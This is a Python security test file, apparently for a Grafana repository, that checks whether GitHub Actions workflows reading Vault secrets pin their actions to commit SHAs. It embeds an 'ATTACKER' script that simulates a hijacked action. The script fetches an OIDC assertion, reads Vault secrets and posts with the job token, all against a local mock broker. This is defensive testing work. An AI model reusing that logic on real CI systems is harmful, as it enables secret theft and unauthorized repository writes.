#!/usr/bin/env python3
"""Security spec for unpinned Vault reads in GitHub Actions workflows.

A moving `uses` ref is resolved by the runner through
ResolveActionDownloadInfoAsync, which sends the ref as written and then
downloads whatever commit the service returns for it
(actions/runner v2.338.2 ActionManager.cs). A full commit SHA is the only
ref these tests treat as immutable. Any other ref is the attacker's copy
of that action.

The tests fail while that copy can read a Vault secret this workflow asks
for, or can call the GitHub API with the job token's actions, issues, or
pull-request write permission. They pass once every such action is pinned
to a full commit SHA and the job that reads Vault no longer has those
write permissions.

Run:
  python3 -m pip install --user PyYAML
  python3 scripts/ci/vault_action_pin_test.py
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
WRITE_SCOPES = ("actions", "issues", "pull-requests")
SHA_RE = re.compile(r"^[0-9a-fA-F]{40}$")
EXPR_RE = re.compile(r"\$\{\{\s*(.*?)\s*\}\}", re.DOTALL)

# Placeholder values only. These are not credentials.
JOB_TOKEN = "placeholder-job-token"
OIDC_REQUEST_TOKEN = "placeholder-oidc-request"
OIDC_ASSERTION = "placeholder-oidc-assertion"


def secret_placeholder(env_name: str) -> str:
    return f"placeholder-vault-{env_name}"


class WorkflowError(Exception):
    pass


def load_workflow(path: Path) -> dict:
    # YAML 1.1 would turn the key "on" into True. The jobs do not depend on it.
    class Loader(yaml.SafeLoader):
        pass

    Loader.yaml_implicit_resolvers = {
        key: [(tag, regexp) for tag, regexp in resolvers if tag != "tag:yaml.org,2002:bool"]
        for key, resolvers in Loader.yaml_implicit_resolvers.items()
    }
    with path.open() as handle:
        document = yaml.load(handle, Loader=Loader)
    if not isinstance(document, dict) or not isinstance(document.get("jobs"), dict):
        raise WorkflowError(f"{path} has no jobs")
    return document


def normalize_permissions(value) -> dict:
    if value in (None, {}):
        return {}
    if isinstance(value, str):
        if value not in ("read-all", "write-all"):
            raise WorkflowError(f"unsupported permissions value {value!r}")
        level = "write" if value == "write-all" else "read"
        return {scope: level for scope in ("contents", "actions", "issues", "pull-requests", "id-token")}
    if not isinstance(value, dict):
        raise WorkflowError(f"unsupported permissions value {value!r}")
    return {str(key): value[key] for key in value}


def effective_permissions(workflow: dict, job: dict) -> dict:
    # A job permissions block replaces the workflow block. A job without one
    # inherits the workflow block (WorkflowTemplateConverter.cs).
    if "permissions" in job:
        return normalize_permissions(job.get("permissions"))
    if "permissions" in workflow:
        return normalize_permissions(workflow.get("permissions"))
    return {}


def parse_uses(uses: str) -> tuple[str, str] | None:
    if uses.startswith("./") or uses.startswith("docker://"):
        return None
    if "@" not in uses:
        return None
    action, ref = uses.rsplit("@", 1)
    return action, ref


def is_pinned(ref: str) -> bool:
    return SHA_RE.match(ref) is not None


def parse_secret_lines(block: str | None) -> list[tuple[str, str, str]]:
    mappings = []
    if not block:
        return mappings
    for raw in str(block).splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line or ":" not in line:
            continue
        env_name, rest = line.split("=", 1)
        path, key = rest.rsplit(":", 1)
        mappings.append((env_name.strip(), path.strip(), key.strip()))
    return mappings


def vault_object_path(repository: str, secret_path: str) -> str:
    # translate-secrets.bash v1 mount layout.
    return f"ci/data/repo/{repository}/{secret_path}"


class ExprError(Exception):
    pass


class Parser:
    def __init__(self, text: str):
        self.tokens = tokenize(text)
        self.index = 0

    def peek(self):
        return self.tokens[self.index] if self.index < len(self.tokens) else None

    def pop(self):
        token = self.peek()
        self.index += 1
        return token

    def parse(self):
        expr = self.parse_or()
        if self.peek() is not None:
            raise ExprError(f"leftover {self.peek()!r}")
        return expr

    def parse_or(self):
        left = self.parse_and()
        while self.peek() == "||":
            self.pop()
            right = self.parse_and()
            left = ("or", left, right)
        return left

    def parse_and(self):
        left = self.parse_not()
        while self.peek() == "&&":
            self.pop()
            right = self.parse_not()
            left = ("and", left, right)
        return left

    def parse_not(self):
        if self.peek() == "!":
            self.pop()
            return ("not", self.parse_not())
        return self.parse_cmp()

    def parse_cmp(self):
        left = self.parse_primary()
        if self.peek() in ("==", "!="):
            op = self.pop()
            return (op, left, self.parse_primary())
        return left

    def parse_primary(self):
        token = self.pop()
        if token == "(":
            expr = self.parse_or()
            if self.pop() != ")":
                raise ExprError("missing )")
            return expr
        if token is None:
            raise ExprError("unexpected end")
        if token in ("true", "false"):
            return ("lit", token == "true")
        if token.startswith(("'", '"')):
            return ("lit", token[1:-1])
        if re.fullmatch(r"-?\d+", token):
            return ("lit", token)
        if self.peek() == "(":
            self.pop()
            args = []
            if self.peek() != ")":
                args.append(self.parse_or())
                while self.peek() == ",":
                    self.pop()
                    args.append(self.parse_or())
            if self.pop() != ")":
                raise ExprError("missing )")
            expr = ("call", token, args)
        else:
            expr = ("path", token)
        while isinstance(self.peek(), str) and self.peek().startswith("."):
            member = self.pop()[1:]
            if not member:
                raise ExprError("empty member")
            expr = ("member", expr, member)
        return expr


def tokenize(text: str) -> list[str]:
    pattern = re.compile(
        r"\s+|(==|!=|&&|\|\||!|,|\(|\))|'(?:\\'|[^'])*'|\"(?:\\\"|[^\"])*\"|[A-Za-z0-9_.\-*]+"
    )
    tokens = []
    position = 0
    while position < len(text):
        match = pattern.match(text, position)
        if not match:
            raise ExprError(f"cannot tokenize {text[position:position + 20]!r}")
        token = match.group(0)
        position = match.end()
        if token.strip() and token.strip() != token:
            continue
        if token.strip():
            tokens.append(token)
    return tokens


def lookup(context: dict, path: str):
    current = context
    for part in path.split("."):
        if part == "*":
            if not isinstance(current, list):
                return []
            flattened = []
            for item in current:
                if isinstance(item, dict):
                    flattened.append(item)
            current = flattened
            continue
        if isinstance(current, list):
            values = []
            for item in current:
                if isinstance(item, dict) and part in item:
                    values.append(item[part])
            return values if len(values) != 1 else values[0]
        if not isinstance(current, dict) or part not in current:
            return None
        current = current[part]
    return current


def evaluate(node, context: dict):
    kind = node[0]
    if kind == "lit":
        return node[1]
    if kind == "path":
        return lookup(context, node[1])
    if kind == "not":
        return not evaluate(node[1], context)
    if kind == "and":
        return bool(evaluate(node[1], context)) and bool(evaluate(node[2], context))
    if kind == "or":
        return bool(evaluate(node[1], context)) or bool(evaluate(node[2], context))
    if kind == "==":
        return evaluate(node[1], context) == evaluate(node[2], context)
    if kind == "!=":
        return evaluate(node[1], context) != evaluate(node[2], context)
    if kind == "call":
        name, args = node[1], node[2]
        values = [evaluate(arg, context) for arg in args]
        if name == "startsWith":
            return str(values[0] or "").startswith(str(values[1]))
        if name == "endsWith":
            return str(values[0] or "").endswith(str(values[1]))
        if name in ("success", "always"):
            return True
        if name in ("failure", "cancelled"):
            return False
        if name == "contains":
            haystack, needle = values
            if isinstance(haystack, list):
                return needle in haystack
            return needle in str(haystack or "")
        if name == "fromJSON":
            raw = values[0]
            return json.loads(raw) if isinstance(raw, str) else raw
        raise ExprError(f"unsupported call {name}")
    if kind == "member":
        base = evaluate(node[1], context)
        if isinstance(base, str):
            base = json.loads(base)
        if isinstance(base, dict):
            return base.get(node[2])
        return None
    raise ExprError(f"unsupported node {kind}")


def condition_text(value) -> str | None:
    if value is None:
        return None
    text = str(value).strip()
    match = EXPR_RE.fullmatch(text)
    if match:
        text = match.group(1).strip()
    return text


def condition_holds(value, context: dict) -> bool:
    text = condition_text(value)
    if text is None:
        return True
    try:
        return bool(evaluate(Parser(text).parse(), context))
    except ExprError as exc:
        raise WorkflowError(f"cannot evaluate condition {text!r}: {exc}") from exc


def seed_context(workflow: dict) -> dict:
    context = {
        "github": {
            "repository": "grafana/grafana",
            "repository_owner": "grafana",
            "ref_name": "main",
            "event_name": "push",
            "actor": "octocat",
            "token": JOB_TOKEN,
            "event": {
                "action": "opened",
                "label": {"name": "area/example"},
                "workflow_run": {"conclusion": "success", "id": 1},
                "pull_request": {"head": {"repo": {"fork": False}}, "draft": False, "user": {"login": "octocat"}},
                "issue": {"author_association": "NONE", "number": 1, "labels": []},
            },
        },
        "needs": {},
        "steps": {},
        "secrets": {"GITHUB_TOKEN": JOB_TOKEN},
    }
    for job_name, job in workflow.get("jobs", {}).items():
        text = condition_text(job.get("if")) or ""
        for match in re.finditer(r"needs\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)\s*(==|!=)\s*'([^']*)'", text):
            job_id, output, op, expected = match.groups()
            context["needs"].setdefault(job_id, {"outputs": {}, "result": "success"})
            if op == "==":
                context["needs"][job_id]["outputs"][output] = expected
            elif expected == "[]":
                context["needs"][job_id]["outputs"][output] = "[1]"
        for step in job.get("steps") or []:
            step_text = condition_text(step.get("if")) or ""
            for match in re.finditer(
                r"steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)\s*==\s*'([^']*)'", step_text
            ):
                step_id, output, expected = match.groups()
                context["steps"].setdefault(step_id, {"outputs": {}})
                context["steps"][step_id]["outputs"][output] = expected
    context["_seed_steps"] = context["steps"]
    return context


def eval_template_string(value: str, context: dict):
    if not isinstance(value, str) or "${{" not in value:
        return value

    def replace(match):
        try:
            result = evaluate(Parser(match.group(1).strip()).parse(), context)
        except ExprError as exc:
            raise WorkflowError(f"cannot evaluate {match.group(0)!r}: {exc}") from exc
        if isinstance(result, (dict, list)):
            return json.dumps(result)
        return "" if result is None else str(result)

    whole = EXPR_RE.fullmatch(value.strip())
    if whole:
        try:
            return evaluate(Parser(whole.group(1).strip()).parse(), context)
        except ExprError as exc:
            raise WorkflowError(f"cannot evaluate {value!r}: {exc}") from exc
    return EXPR_RE.sub(replace, value)


class Broker:
    def __init__(self):
        self.captures: list[dict] = []
        self.lock = threading.Lock()
        self.vault: dict[tuple[str, str], str] = {}
        self.permissions: dict[str, str] = {}
        self.oidc_enabled = False

    def handler(self):
        broker = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _json(self, code: int, payload: dict):
                body = json.dumps(payload).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def _read_body(self):
                length = int(self.headers.get("Content-Length", "0"))
                if length == 0:
                    return {}
                return json.loads(self.rfile.read(length).decode() or "{}")

            def do_GET(self):
                if self.path.startswith("/oidc?"):
                    header = self.headers.get("Authorization", "")
                    if header != f"Bearer {OIDC_REQUEST_TOKEN}" or not broker.oidc_enabled:
                        self._json(401, {})
                        return
                    self._json(200, {"value": OIDC_ASSERTION})
                    return
                if self.path.startswith("/v1/"):
                    if self.headers.get("X-Vault-Token") != OIDC_ASSERTION:
                        self._json(403, {})
                        return
                    key = self.path.split("key=", 1)[1] if "key=" in self.path else ""
                    path = self.path.split("?", 1)[0][len("/v1/") :]
                    value = broker.vault.get((path, key))
                    if value is None:
                        self._json(404, {})
                        return
                    self._json(200, {"data": {"data": {key: value}}})
                    return
                self._json(404, {})

            def do_POST(self):
                body = self._read_body()
                header = self.headers.get("Authorization", "")
                scope = {
                    "/github/dispatches": "actions",
                    "/github/issue-comments": "issues",
                    "/github/pull-comments": "pull-requests",
                }.get(self.path)
                if scope is None:
                    self._json(404, {})
                    return
                if header != f"Bearer {JOB_TOKEN}":
                    self._json(401, {})
                    return
                if broker.permissions.get(scope) != "write":
                    self._json(403, {"scope": scope})
                    return
                with broker.lock:
                    broker.captures.append({"kind": "github-write", "scope": scope, "body": body})
                self._json(201, {"ok": True})

        return Handler


def start_broker() -> tuple[Broker, ThreadingHTTPServer]:
    broker = Broker()
    server = ThreadingHTTPServer(("127.0.0.1", 0), broker.handler())
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return broker, server


ATTACKER = r"""
import json, os, urllib.request

def request(method, url, headers, body=None):
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.status, response.read().decode()
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode()

base = os.environ["BROKER"]
repo = os.environ.get("GITHUB_REPOSITORY", "")
found = []
token = os.environ.get("JOB_TOKEN", "")
if token:
    for path in ("/github/dispatches", "/github/issue-comments", "/github/pull-comments"):
        request("POST", base + path, {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, {"from": "action"})

mappings = []
for source in ("REPO_SECRETS", "KNOWN_MAPPINGS"):
    mappings.extend(line.strip() for line in os.environ.get(source, "").splitlines() if "=" in line)
oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_bearer = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
assertion = ""
if oidc_url and oidc_bearer:
    status, payload = request("GET", oidc_url, {"Authorization": f"Bearer {oidc_bearer}"})
    if status == 200:
        assertion = json.loads(payload)["value"]
if assertion:
    for line in mappings:
        env_name, rest = line.split("=", 1)
        secret_path, key = rest.rsplit(":", 1)
        object_path = f"ci/data/repo/{repo}/{secret_path.strip()}"
        status, payload = request(
            "GET",
            f"{base}/v1/{object_path}?key={key.strip()}",
            {"X-Vault-Token": assertion},
        )
        if status == 200:
            value = json.loads(payload)["data"]["data"][key.strip()]
            found.append({"env": env_name.strip(), "value": value})

for value in json.loads(os.environ.get("INPUTS_JSON", "{}")).values():
    text = value if isinstance(value, str) else json.dumps(value)
    for line in mappings:
        env_name = line.split("=", 1)[0].strip()
        marker = os.environ.get(f"EXPECT_{env_name}")
        if marker and marker in text:
            found.append({"env": env_name, "value": marker, "via": "input"})

with open(os.environ["CAPTURE_PATH"], "w") as handle:
    json.dump({"vault": found, "saw_unscoped_github_token": "GITHUB_TOKEN" in os.environ}, handle)
"""


def run_attacker(env: dict, capture_path: Path) -> dict:
    script = capture_path.with_suffix(".py")
    script.write_text(ATTACKER)
    completed = subprocess.run(
        ["python3", str(script)],
        env=env,
        check=False,
        text=True,
        capture_output=True,
    )
    if completed.returncode != 0:
        raise WorkflowError(completed.stderr or completed.stdout)
    return json.loads(capture_path.read_text())


def job_secret_lines(job: dict) -> list[str]:
    lines = []
    for step in job.get("steps") or []:
        uses = step.get("uses")
        if not isinstance(uses, str) or "get-vault-secrets" not in uses:
            continue
        with_block = step.get("with") or {}
        for key in ("repo_secrets", "common_secrets"):
            block = with_block.get(key)
            if isinstance(block, str):
                for mapping in parse_secret_lines(block):
                    lines.append(f"{mapping[0]}={mapping[1]}:{mapping[2]}")
    return lines


def vault_job_closure(workflow: dict) -> set[str]:
    jobs = workflow["jobs"]
    needed = {
        name
        for name, job in jobs.items()
        if any(
            isinstance(step.get("uses"), str) and "get-vault-secrets" in step["uses"]
            for step in job.get("steps") or []
        )
    }
    changed = True
    while changed:
        changed = False
        for name in list(needed):
            needs = jobs[name].get("needs") or []
            if isinstance(needs, str):
                needs = [needs]
            for item in needs:
                if item not in needed:
                    needed.add(item)
                    changed = True
    return needed


def execute(workflow: dict, context: dict, broker: Broker, base_url: str) -> tuple[list[str], dict[str, bool]]:
    jobs = workflow["jobs"]
    pending = set(vault_job_closure(workflow))
    selected: dict[str, bool] = {}
    exposures: list[str] = []
    while pending:
        progressed = False
        for name in list(pending):
            job = jobs[name]
            needs = job.get("needs") or []
            if isinstance(needs, str):
                needs = [needs]
            if any(item not in selected for item in needs):
                continue
            progressed = True
            pending.remove(name)
            if any(not selected[item] for item in needs) or not condition_holds(job.get("if"), context):
                selected[name] = False
                continue
            selected[name] = True
            exposures.extend(execute_job(name, job, workflow, context, broker, base_url))
        if not progressed:
            raise WorkflowError(f"job cycle or missing need: {sorted(pending)}")
    return exposures, selected


def execute_job(name: str, job: dict, workflow: dict, context: dict, broker: Broker, base_url: str) -> list[str]:
    if not isinstance(job.get("steps"), list):
        return []
    permissions = effective_permissions(workflow, job)
    secret_lines = job_secret_lines(job)
    exposures = []
    broker.permissions = permissions
    broker.oidc_enabled = permissions.get("id-token") == "write"
    broker.vault = {}
    repository = context["github"]["repository"]
    for line in secret_lines:
        env_name, rest = line.split("=", 1)
        secret_path, key = rest.rsplit(":", 1)
        broker.vault[(vault_object_path(repository, secret_path), key)] = secret_placeholder(env_name)

    unpinned_remote = False
    for step in job.get("steps") or []:
        parsed = parse_uses(step["uses"]) if isinstance(step.get("uses"), str) else None
        if parsed is not None and not is_pinned(parsed[1]):
            unpinned_remote = True
    # The release token is the one named by the finding. Other jobs share the
    # failure when an unpinned action still sits in a job that can write.
    if secret_lines and any(permissions.get(scope) == "write" for scope in WRITE_SCOPES) and (
        unpinned_remote or any(line.startswith("METICULOUS_API_TOKEN=") for line in secret_lines)
    ):
        # The job token is presented to the API with the permissions from this
        # job. A write that succeeds is the outcome the Vault step must not have.
        for scope, path in (
            ("actions", "/github/dispatches"),
            ("issues", "/github/issue-comments"),
            ("pull-requests", "/github/pull-comments"),
        ):
            if permissions.get(scope) != "write":
                continue
            request = urllib.request.Request(
                base_url + path,
                data=b"{}",
                headers={"Authorization": f"Bearer {JOB_TOKEN}", "Content-Type": "application/json"},
                method="POST",
            )
            try:
                with urllib.request.urlopen(request, timeout=5) as response:
                    status = response.status
            except urllib.error.HTTPError as error:
                status = error.code
            if status < 300:
                exposures.append(f"{name}: job token allows {scope}:write")

    context["steps"] = json.loads(json.dumps(context.get("_seed_steps") or {}))
    for index, step in enumerate(job["steps"]):
        step_name = step.get("name") or step.get("id") or f"step-{index + 1}"
        if not condition_holds(step.get("if"), context):
            continue
        uses = step.get("uses")
        if not isinstance(uses, str):
            continue
        parsed = parse_uses(uses)
        if parsed is None:
            continue
        action, ref = parsed
        raw_with = step.get("with") or {}
        if is_pinned(ref):
            if "get-vault-secrets" in action:
                publish_vault_output(step, raw_with, context, repository)
            continue
        with_values = {}
        for key, value in raw_with.items():
            with_values[key] = eval_template_string(value, context) if isinstance(value, str) else value
        if not secret_lines and not any(permissions.get(scope) == "write" for scope in WRITE_SCOPES):
            continue
        capture = run_unpinned_action(
            step, with_values, secret_lines, permissions, repository, broker, base_url
        )
        for item in capture["vault"]:
            exposures.append(f"{name}/{step_name}: action at ref {ref} read Vault secret {item['env']}")
        if capture["saw_unscoped_github_token"]:
            exposures.append(f"{name}/{step_name}: GITHUB_TOKEN was injected without an expression")
    return exposures


def publish_vault_output(step: dict, with_values: dict, context: dict, repository: str) -> None:
    step_id = step.get("id")
    if not step_id:
        return
    payload = {}
    for env_name, _path, _key in parse_secret_lines(str(with_values.get("repo_secrets") or "")):
        payload[env_name] = secret_placeholder(env_name)
    context["steps"].setdefault(step_id, {"outputs": {}})
    context["steps"][step_id]["outputs"]["secrets"] = json.dumps(payload)


def run_unpinned_action(step, with_values, secret_lines, permissions, repository, broker, base_url) -> dict:
    # Composite step env expressions may read github.token. The runner does not
    # otherwise export that context field (GitHubContext allowlist omits token).
    capture_dir = Path(tempfile.mkdtemp(prefix="vault-action-"))
    capture_path = capture_dir / "capture.json"
    env = {
        "PATH": os.environ.get("PATH", ""),
        "BROKER": base_url,
        "CAPTURE_PATH": str(capture_path),
        "GITHUB_REPOSITORY": repository,
        "JOB_TOKEN": JOB_TOKEN,
        "INPUTS_JSON": json.dumps({key: value if isinstance(value, str) else json.dumps(value) for key, value in with_values.items()}),
        "REPO_SECRETS": str(with_values.get("repo_secrets") or ""),
        "KNOWN_MAPPINGS": "\n".join(secret_lines),
    }
    for env_name, _path, _key in parse_secret_lines("\n".join(secret_lines)):
        env[f"EXPECT_{env_name}"] = secret_placeholder(env_name)
    if permissions.get("id-token") == "write":
        env["ACTIONS_ID_TOKEN_REQUEST_URL"] = f"{base_url}/oidc?audience=vault-github-actions-grafana-ops"
        env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = OIDC_REQUEST_TOKEN
    try:
        return run_attacker(env, capture_path)
    finally:
        shutil.rmtree(capture_dir, ignore_errors=True)


def trigger_events(workflow: dict) -> list[str]:
    triggers = workflow.get("on")
    if isinstance(triggers, str):
        return [triggers]
    if isinstance(triggers, list):
        return [str(item) for item in triggers]
    if isinstance(triggers, dict):
        return [str(item) for item in triggers]
    return ["push"]


FIXED_WORKFLOW = {
    "permissions": {"contents": "read"},
    "jobs": {
        "read-vault": {
            "permissions": {"contents": "read", "id-token": "write"},
            "steps": [
                {
                    "id": "vault-secrets",
                    "uses": "grafana/shared-workflows/actions/get-vault-secrets@0123456789abcdef0123456789abcdef01234567",
                    "with": {"repo_secrets": "METICULOUS_API_TOKEN=meticulous-ui:api-token\n"},
                },
                {
                    "uses": "example/upload@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "with": {"api-token": "${{ fromJSON(steps.vault-secrets.outputs.secrets).METICULOUS_API_TOKEN }}"},
                },
            ],
        },
        "comment": {
            "permissions": {"contents": "read", "pull-requests": "write"},
            "steps": [{"uses": "actions/github-script@v8", "with": {"script": "core.info('ok')"}}],
        },
    },
}


class VaultActionPinTest(unittest.TestCase):
    def audit(self, workflow: dict, context: dict | None = None) -> tuple[list[str], dict[str, bool]]:
        broker, server = start_broker()
        base_url = f"http://127.0.0.1:{server.server_address[1]}"
        try:
            return execute(workflow, context or seed_context(workflow), broker, base_url)
        finally:
            server.shutdown()
            server.server_close()

    def test_pinned_split_job_exposes_nothing(self):
        exposures, selected = self.audit(FIXED_WORKFLOW)
        self.assertTrue(selected["read-vault"])
        self.assertEqual(exposures, [])

    def test_unpinned_fixture_is_rejected(self):
        workflow = json.loads(json.dumps(FIXED_WORKFLOW))
        workflow["jobs"]["read-vault"]["steps"][0]["uses"] = (
            "grafana/shared-workflows/actions/get-vault-secrets@main"
        )
        workflow["jobs"]["read-vault"]["permissions"]["actions"] = "write"
        exposures, _selected = self.audit(workflow)
        self.assertTrue(any("read Vault secret METICULOUS_API_TOKEN" in item for item in exposures))
        self.assertTrue(any("actions:write" in item for item in exposures))

    def test_release_and_other_vault_reads_are_not_attacker_controlled(self):
        failures = []
        reached = []
        for path in sorted(WORKFLOWS.glob("*.yml")) + sorted(WORKFLOWS.glob("*.yaml")):
            workflow = load_workflow(path)
            vault_jobs = [
                name
                for name, job in workflow["jobs"].items()
                if any(
                    isinstance(step.get("uses"), str) and "get-vault-secrets" in step["uses"]
                    for step in job.get("steps") or []
                )
            ]
            if not vault_jobs:
                continue
            seen = set()
            selected_any = {name: False for name in vault_jobs}
            for event_name in trigger_events(workflow):
                for action_name in ("opened", "typed"):
                    context = seed_context(workflow)
                    context["github"]["event_name"] = event_name
                    context["github"]["event"]["action"] = action_name
                    exposures, selected = self.audit(workflow, context)
                for name in vault_jobs:
                    selected_any[name] = selected_any[name] or bool(selected.get(name))
                for item in exposures:
                    seen.add(f"{path.name} ({event_name}): {item}")
            for name, was_selected in selected_any.items():
                if not was_selected:
                    failures.append(f"{path.name}:{name} was not reached")
                else:
                    reached.append(f"{path.name}:{name}")
            failures.extend(sorted(seen))
        self.assertTrue(reached)
        self.assertEqual(failures, [])

    def test_renovate_without_label_does_not_select_release_meticulous_job(self):
        workflow = load_workflow(WORKFLOWS / "release-build.yml")
        context = seed_context(workflow)
        context["needs"]["setup"]["outputs"]["run-meticulous"] = "false"
        _exposures, selected = self.audit(workflow, context)
        self.assertFalse(selected["run-meticulous-tests"])

    def test_fork_pull_request_does_not_select_pr_docker_job(self):
        workflow = load_workflow(WORKFLOWS / "pr-build-grafana.yml")
        context = seed_context(workflow)
        context["github"]["event_name"] = "pull_request"
        context["github"]["event"]["pull_request"]["head"]["repo"]["fork"] = True
        context["needs"].pop("detect-changes", None)
        _exposures, selected = self.audit(workflow, context)
        self.assertFalse(selected["build-docker"])


if __name__ == "__main__":
    unittest.main()
